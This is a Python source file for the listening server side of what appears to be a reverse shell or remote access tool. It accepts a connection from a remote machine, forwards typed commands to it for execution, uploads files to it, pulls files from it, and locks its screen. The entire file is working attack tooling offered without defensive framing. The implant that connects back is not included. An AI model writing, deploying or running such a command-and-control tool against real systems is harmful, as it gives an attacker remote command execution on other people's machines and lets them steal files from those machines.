import socket
import argparse
import time
import os




def accept_connection(server_socket):
    client, address = server_socket.accept()
    print(F'[+] Connection established from: {address}')
    handle_data(client)
    

def handle_data(client):
    try:    
        while True:
            prompt = input("$ ")
            if prompt == "lock":
                lock_screen(client)
                continue
            if len(prompt.strip()) == 0:
                continue
            if len(prompt.split(" ")) == 3 and prompt.split(" ")[0] in ("download", "upload"):
                handle_file(client, prompt)
                continue
            client.send(prompt.encode())
            if prompt == "exit":
                break
            data = client.recv(1024).decode()
            if data:
                print(data)
    except KeyboardInterrupt:
        print('Server closed')
    client.close()


def upload_file(src, dst, client):
    """ Upload a file to remote machine """
    if os.path.isfile(src):
        client.send(F"upload {dst}".encode())
        with open(src, 'rb') as fd:
            if fd.readable():    
                while True:
                    try:
                        content = fd.read(1024)
                        if not content:
                            time.sleep(1)
                            client.send(b":DONE:")
                            print(F"[+] File: {src} was uploaded successfully")
                            break
                        client.send(content)
                    except (KeyboardInterrupt, EOFError) as err:
                        print(F"[-] Could not upload file to remote machine: {repr(err)}")
                        client.send(b":ABORT:")
                        break
            else:
                print(F"[!] File '{src}' is not readable...")
    else:
        print(F"[-] No such file '{src}'")



def download_file(src_file, dst_file, client):
    """ Download a file from remote machine """
    client.send(F"download {src_file}".encode())
    with open(dst_file, 'wb') as fd:
        if fd.writable():
            while True:
                source_data = client.recv(1024)
                if source_data == b":DONE:":
                    print(F"[+] File: {dst_file} was downloaded successfully")
                    break
                elif b":ABORT:" in source_data[:7]:
                    print(F"[-] Failure reason: {source_data[8:].decode()}")
                    os.remove(dst_file)
                    break
                fd.write(source_data)
        else:
            print(F"File '{dst_file}' is not writeable...")


def handle_file(client, data):
    """ data is split into 3 parts: upload/download, src and dst """
    command, src, dst = data.split(" ")
    if command == "upload":
        upload_file(src, dst, client)
    elif command == "download":
        download_file(src, dst, client)

        
def lock_screen(client):
    """ Lock remote machine screen """
    client.send('xdg-screensaver lock'.encode())


def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('--ip', type=str, required=True)
    parser.add_argument('--port', type=int, required=True)
    args = parser.parse_args()
    return args


def main():
    args = get_args()
    ip, port = args.ip, args.port
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((ip, port))
    server_socket.listen()
    print(F"Server is ls listening on {ip}:{port}")
    accept_connection(server_socket)
    server_socket.close()



if __name__ == "__main__":
    main()


